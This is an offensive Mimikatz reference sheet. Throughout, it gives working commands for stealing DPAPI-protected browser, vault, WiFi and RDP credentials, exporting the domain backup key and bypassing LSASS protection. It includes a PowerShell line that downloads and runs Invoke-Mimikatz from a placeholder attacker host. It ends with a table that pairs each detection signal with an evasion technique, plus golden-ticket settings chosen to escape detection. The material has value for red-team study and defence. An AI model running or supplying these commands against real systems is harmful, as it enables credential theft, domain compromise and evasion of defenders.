# Mimikatz — Deep Reference

## DPAPI Architecture

DPAPI (Data Protection API) encrypts secrets using a hierarchical key chain:

```
User password
    └── Derived key
            └── MasterKey (stored in %APPDATA%\Microsoft\Protect\{SID}\{GUID})
                    └── Encrypts: browser passwords, vault creds, WiFi PSKs, RDP creds
```

**MasterKey GUID locations:**
```
User MasterKeys:   C:\Users\<user>\AppData\Roaming\Microsoft\Protect\<SID>\
System MasterKeys: C:\Windows\System32\Microsoft\Protect\S-1-5-18\User\
                   C:\Windows\System32\Microsoft\Protect\S-1-5-18\
```

**Domain Backup Key:**  
Each domain has a domain DPAPI backup key stored in the `CN=BCKUPKEY_*` objects in AD. Any domain admin can extract it. With it: decrypt ALL user MasterKeys in the domain offline.

```
# Extract domain backup key (DA required)
dpapi::backupkeys /export /system:DC_IP

# Files produced:
# ntds_capi_0_*.pvk  → legacy key
# ntds_capi_0_*.der  → backup key certificate
```

---

## DPAPI: Chrome / Edge Passwords

Chrome encrypts credentials using DPAPI (Windows) and since v80+, App-Bound Encryption.

### Pre-v128 (standard DPAPI)

```
# Location: %LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data (SQLite)
# Blob: prefix "DPAPI" (v10) or raw DPAPI

# Decrypt inline (user context)
dpapi::chrome /in:"%localappdata%\Google\Chrome\User Data\Default\Login Data" /unprotect

# With masterkey explicitly
dpapi::chrome /in:"Login Data" /masterkey:MASTERKEY_HEX

# Or export blobs then decrypt offline
```

### App-Bound Encryption (Chrome v128+)

```
# Chrome uses a separate elevation service to protect keys
# DPAPI blob is wrapped with app-bound key (system-level DPAPI)
# Need SYSTEM context to decrypt the outer key

# From SYSTEM shell:
mimikatz # privilege::debug
mimikatz # token::elevate
mimikatz # dpapi::chrome /in:"%localappdata%\Google\Chrome\User Data\Local State" /state
mimikatz # dpapi::chrome /in:"%localappdata%\Google\Chrome\User Data\Default\Login Data" /unprotect

# Alternative: SharpChrome (standalone, handles app-bound)
SharpChrome.exe logins /unprotect
```

---

## DPAPI: Windows Credential Vault

```
# User vault (credentials entered in Windows, mapped network drives, etc.)
# Location: %LOCALAPPDATA%\Microsoft\Credentials\
# or: C:\Users\<user>\AppData\Local\Microsoft\Credentials\{GUID}

# List vault entries
vault::list

# Decrypt credential blob (needs MasterKey)
dpapi::cred /in:"%localappdata%\Microsoft\Credentials\{GUID}"

# If masterkey not cached: first get masterkey
dpapi::masterkey /in:"%appdata%\Microsoft\Protect\{SID}\{GUID}" /protected
# or with user password:
dpapi::masterkey /in:"MasterKey" /password:UserPassword

# One-shot: enumerate and decrypt all vault creds (if running as user)
dpapi::cred /in:"%localappdata%\Microsoft\Credentials" /unprotect
```

---

## DPAPI: WiFi PSK

```
# WiFi profiles stored as XML in C:\ProgramData\Microsoft\Wlansvc\Profiles\Interfaces\{IF_GUID}\
# PSK encrypted with system DPAPI (requires SYSTEM or admin)

# List all WiFi networks
netsh wlan show profiles

# Export single profile (shows DPAPI blob, not plaintext)
netsh wlan export profile name="NetworkName" folder=C:\Temp key=clear
# "key=clear" only works from SYSTEM — reveals plaintext PSK in exported XML

# Mimikatz:
# Must be SYSTEM (or have LocalSystem token)
token::elevate
dpapi::wifi /unprotect

# Or use backupkey if offline
```

---

## DPAPI: RDP Credentials

```
# Saved RDP credentials: %LOCALAPPDATA%\Microsoft\Credentials\
# Same vault mechanism as network credentials above

# Find RDP cred blobs
dir %localappdata%\Microsoft\Credentials\

# Decrypt
dpapi::cred /in:"%localappdata%\Microsoft\Credentials\{GUID}" /unprotect

# Also check: HKCU\SOFTWARE\Microsoft\Terminal Server Client\Servers
# Registry stores hostnames but not passwords (those are in vault blobs)
```

---

## DPAPI: Offline Decryption with Domain Backup Key

```bash
# Step 1: Extract domain DPAPI backup key (from live DC or via secretsdump)
mimikatz # dpapi::backupkeys /export /system:DC_IP
# or via impacket:
dpapi.py backupkeys --export -t DOMAIN/admin:pass@DC_IP

# Step 2: On attacker machine — decrypt user MasterKey with backup key
dpapi.py masterkey -file %appdata%\Microsoft\Protect\{SID}\{GUID} \
  -pvk ntds_capi_0_*.pvk

# Step 3: Use decrypted MasterKey to decrypt credential blobs
dpapi.py credential -file %localappdata%\Microsoft\Credentials\{GUID} \
  -key MASTERKEY_HEX

# Full offline pipeline (all users from image/backup)
for user_dir in /mnt/disk/Users/*/; do
  sid=$(cat "$user_dir/AppData/Roaming/Microsoft/Protect/"*/guid 2>/dev/null)
  for mk in "$user_dir"/AppData/Roaming/Microsoft/Protect/*/*; do
    dpapi.py masterkey -file "$mk" -pvk backup.pvk 2>/dev/null
  done
done
```

---

## Protected Users Group + Credential Guard Behavior

**Protected Users** security group (Windows 2012R2+):
- No NTLM, CredSSP, WDigest — Kerberos only
- No delegation
- No cached credentials on disk
- TGTs limited to 4 hours (no renewal)

```
# Check if target is in Protected Users
net user TARGET /domain | findstr /i "Local Group"
# or in Cypher:
MATCH (u:User)-[:MemberOf]->(g:Group {name:"PROTECTED USERS@CORP.LOCAL"}) RETURN u.name
```

**Windows Defender Credential Guard** (Hyper-V isolated LSASS):
- NTLM hashes + Kerberos keys stored in VSM (Virtual Secure Mode)
- `sekurlsa::logonpasswords` returns empty NTLM/Kerberos fields
- Kerberos TGTs still accessible via `sekurlsa::tickets` (they're in LSA, not VSM)
- DPAPI keys NOT protected by Credential Guard — dpapi:: still works
- NTLM derivation still possible via `dpapi::cred` if DPAPI blob exists

```
# Check if Credential Guard is active
# From Windows:
(Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\Microsoft\Windows\DeviceGuard).SecurityServicesRunning
# 1 = Credential Guard running

# Mimikatz output with CG active:
# NTLM: (null)  ← Credential Guard protecting LSASS
# Key List: <empty>
# But: vault credentials, Chrome creds, DPAPI still accessible
```

---

## Protected LSA (PPL) Bypass

Windows 10+ can run LSASS as Protected Process Light (PPL), blocking even admin access.

```
# Check if LSASS runs as PPL
Get-Process lsass | Select-Object -ExpandProperty ProtectionLevel
# or check: HKLM\SYSTEM\CurrentControlSet\Control\Lsa\RunAsPPL = 1

# Bypass options:
# 1. mimidrv.sys kernel driver (included with mimikatz — must load driver)
mimikatz # !+ 
mimikatz # !processprotect /process:lsass.exe /remove
mimikatz # sekurlsa::logonpasswords

# 2. PPLdump (open source, no mimikatz driver needed)
PPLdump64.exe lsass lsass.dmp

# 3. nanodump BOF (Cobalt Strike / C2)
# Bypasses PPL via MiniDumpWriteDump from a fork of lsass

# 4. comsvcs.dll (only works if PPL NOT active)
rundll32 C:\windows\system32\comsvcs.dll MiniDump <PID> C:\Windows\Temp\lsass.dmp full
```

---

## In-Memory Execution Alternatives

When mimikatz.exe is blocked by EDR:

### Invoke-Mimikatz (PowerShell)

```powershell
# Load from memory (no disk touch)
IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -Command '"sekurlsa::logonpasswords"'
Invoke-Mimikatz -Command '"lsadump::dcsync /domain:CORP.LOCAL /user:krbtgt"'
Invoke-Mimikatz -DumpCreds
```

### SafetyKatz (Cobalt Strike compatible)

```
# .NET assembly, runs mimikatz in memory via PInvoke
execute-assembly SafetyKatz.exe "sekurlsa::logonpasswords" "exit"
execute-assembly SafetyKatz.exe "lsadump::dcsync /domain:CORP.LOCAL /all /csv" "exit"
```

### nanodump (LSASS dump only, EDR bypass)

```bash
# Create minidump of LSASS via a fork/handle duplication
nanodump --write C:\Windows\Temp\nd.dmp --fork --snapshot --valid

# Parse offline with mimikatz
sekurlsa::minidump nd.dmp
sekurlsa::logonpasswords
```

### pypykatz (offline, Python)

```bash
pip install pypykatz

# Parse LSASS minidump
pypykatz lsa minidump lsass.dmp

# Parse SAM + SYSTEM hives
pypykatz registry --sam SAM --system SYSTEM

# Output NTHashes only
pypykatz lsa minidump lsass.dmp | grep NT | awk '{print $2}'
```

---

## Detection: EDR Signatures and Evasion Notes

| Technique | Detection Vector | Evasion |
|-----------|-----------------|---------|
| `sekurlsa::logonpasswords` | LSASS read access (handle), strings in binary | BOF/in-memory, obfuscated strings |
| DCSync | Event 4662, replication privilege abuse | Limit to single user: `/user:krbtgt` |
| Ticket forging | Event 4769 (TGS with RC4 for DA) | Use AES256 tickets (no RC4 anomaly) |
| Token impersonation | Event 4624 type 3 (impersonation) | Use `token::revert` immediately after |
| DPAPI backup key extract | LDAP query to CN=BCKUPKEY_* | Query single key by GUID |
| WDigest enable | Registry write to LSA key | Requires admin; logged via Sysmon reg events |
| comsvcs MiniDump | Sysmon Event 10 (LSASS access by rundll32) | Use nanodump fork mode instead |

**Golden Ticket detection:**
- Event 4769 with non-existent account name or service
- TGT lifetime exceeds domain maximum
- Use realistic values: `/startoffset:0 /endin:600 /renewmax:10080`
- Use AES256 key instead of NTLM hash: `-aes256 KRBTGT_AES256`
